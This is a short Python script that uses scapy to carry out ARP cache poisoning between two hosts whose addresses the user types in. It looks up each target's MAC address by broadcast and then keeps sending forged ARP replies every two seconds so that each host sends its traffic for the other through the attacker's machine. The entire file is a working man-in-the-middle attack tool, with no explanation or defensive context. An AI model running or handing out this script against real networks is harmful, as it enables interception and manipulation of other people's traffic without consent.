from scapy.all import *
import time

def get_mac(ip):
    ether_layer = Ether()
    ether_layer.dst = "ff:ff:ff:ff:ff:ff"

    arp_layer = ARP()

    arp_layer.pdst = ip

    packet = ether_layer/arp_layer

    res = srp(packet)
    return res[0][0][1].hwsrc


def attack(target1,target2):
    
    arp1 = ARP()
    arp2 = ARP()

    arp1.op = "is-at"
    arp2.op = "is-at"

    arp1.psrc = target2
    arp2.psrc = target1

    arp1.pdst = target1
    arp2.pdst = target2

    arp1.hwdst = get_mac(target1)
    arp2.hwdst = get_mac(target2)
    
    while(1):
        send(arp1)
        send(arp2)
        time.sleep(2)


target1 = input("input target1: ")
target2 = input("input target2: ")

attack(target1, target2)
